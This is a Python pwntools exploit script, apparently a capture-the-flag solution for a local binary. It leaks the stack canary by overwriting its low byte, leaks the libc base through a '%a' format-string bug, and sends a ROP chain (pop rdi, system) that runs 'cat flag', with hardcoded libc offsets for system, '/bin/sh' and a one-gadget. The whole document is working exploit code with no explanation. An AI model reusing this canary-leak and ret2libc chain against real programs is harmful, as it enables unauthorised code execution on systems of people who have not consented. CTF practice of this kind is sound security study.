from pwn import *
#context.log_level = 'debug'


p = process('./pwn.')
elf = ELF('./pwn.')

def stack(payload):
	p.sendlineafter('option:','1')
	p.sendafter('once..\n',payload)

def secret(payload):
	p.sendlineafter('option:','9011')
	p.sendafter('code:',payload)

def fsb(payload):
	p.sendlineafter('option:','3')
	p.sendafter('think?)\n',payload)

def bored(payload,choice = 'n'):
	p.sendafter('bored...\n',payload)
	p.sendafter('y/n\n',choice)


#leak canary
p.sendlineafter('option:','2')
for i in range(4):
	bored('a')
bored('a','y')

stack('a'*0xa8 + 'a')
p.recv(0xa9)
canary = u64(p.recv(7).rjust(8,'\x00'))
log.success('canary : 0x%x' %canary)

offset_system = 0x0000000000045390
offset_str_bin_sh = 0x18cd57
offset_onegadge = 0xf1147
pop_rdi = 0x0000000000400c53


#leak libc
fsb('%a')
p.recvuntil('0x0.0')
libc_base = int(p.recvuntil('p-',drop = True),16) - 0x3c56a3
log.success('libc base addr : 0x%x' %libc_base)
system_addr = libc_base + offset_system
binsh_addr = libc_base + offset_str_bin_sh
log.success('system addr : 0x%x' %system_addr)
log.success('binsh addr : 0x%x' %binsh_addr)


#cat flag
payload = 'cat flag' + p64(canary) + 'a'*0x8
payload += p64(pop_rdi) + p64(0x602080) + p64(system_addr)

p.sendlineafter('option:','2')
bored(payload,'y')

#gdb.attach(p)
try:
	for i in range(9999):
		secret('\0')

except Exception as e:
	p.close()


p.interactive()
  